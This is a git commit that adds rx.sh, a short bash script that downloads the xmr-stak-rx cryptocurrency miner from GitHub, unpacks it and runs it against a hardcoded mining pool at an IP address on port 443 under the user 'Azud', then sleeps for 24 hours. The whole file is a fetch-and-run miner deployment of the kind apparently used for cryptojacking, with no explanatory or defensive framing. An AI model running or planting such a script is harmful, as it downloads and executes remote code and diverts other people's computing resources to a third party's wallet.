0fb299cdf524cd105425ade2be237f7eca3560fe
SalinaMoh <98037354+SalinaMoh@users.noreply.github.com>
2022-04-02 06:23:35 +0000

    Create rx.sh

---
+++ rx.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz && tar -xvf xmr-stak-rx-linux-1.0.5-cpu.tar.xz && rm xmr-stak-rx-linux-1.0.5-cpu.tar.xz && cd xmr-stak-rx-linux-1.0.5-cpu && ./xmr-stak-rx --url 8.209.98.71:443 --user Azud --pass x --currency randomx_safex
+sleep 24h
